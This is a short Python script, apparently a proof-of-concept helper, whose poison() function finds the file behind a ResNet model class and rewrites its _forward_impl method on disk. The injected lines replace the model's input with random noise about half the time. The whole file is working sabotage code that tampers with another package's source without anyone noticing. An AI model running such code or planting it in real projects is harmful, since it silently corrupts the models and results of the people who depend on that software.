import inspect

import pathlib
import sys

def poison():
    try:
        import <MODULE>.pochelper as pochelper
        module_path = pochelper.target
    except Exception as e:
        return

    class_name = 'ResNet(nn.Module)'
    function_name = '_forward_impl'

    lines = module_path.read_text().splitlines()

    class_definition = ''
    function_line = 0
    function_definition = ''

    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line

    if not class_definition:
        print("Couldn't find class.")
    if not function_definition:
        print("Couldn't find function definition")
    rand_init = "        n = torch.randint(0, 11, (1,)).item()"
    condition = "        if n % 2 == 0:"
    randomize = "            x = torch.randn_like(x)"
    new_code = [rand_init, condition, randomize]

    lines[function_line:function_line] = new_code
    module_path.write_text('\n'.join(lines), encoding='utf-8')
